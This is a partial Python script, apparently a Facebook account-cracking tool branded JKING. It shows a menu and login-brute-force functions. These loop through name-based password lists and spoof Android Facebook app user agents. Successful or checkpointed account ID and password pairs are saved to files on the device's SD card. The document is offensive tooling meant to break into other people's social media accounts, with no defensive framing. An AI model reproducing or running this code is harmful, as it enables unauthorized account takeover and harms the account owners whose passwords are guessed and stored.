...
=======================================================
  Owner    :    JKING
  Github   :    https://github.com/JKING-ID
  Version  :    0.8    
=======================================================""")
...
def JKING():
	...
	print(f" [0] Exit")
	JKING = input("\033[;90m [>]\033[;37m Choose an option : ")
	if JKING in ["2", "02"]:
		gml()
	if JKING in ["3","03"]:
		bd()
	if JKING in ["1", "01","11","A","a"]:
		clear()
...
def api(ids,names,passlist): 
                try:
                        global ok,loop
                        prog.update(des,description=f"{h}Success{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]");prog.advance(des)          
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [JKING-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/JKING-OK.txt','a').write(ids+'|'+pas+'\n')
                                        cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [JKING-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/JKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [JKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = "Dalvik/2.1.0 (Linux; U; Android 9; LLD-L31 Build/QP1A.770800.653) [FBAN/FB4A;FBAV/112.0.0.22.107;FBBV/385537869;FBDM/{density=2.75,width=1080,height=2132};FBLC/en_GB;FBRV/387781654;FBCR/ZZ;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2010J19SY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
                                ua_string = "Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/311.0.0.1.378;FBBV/434770443;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  JKING, Haris, Bilal')
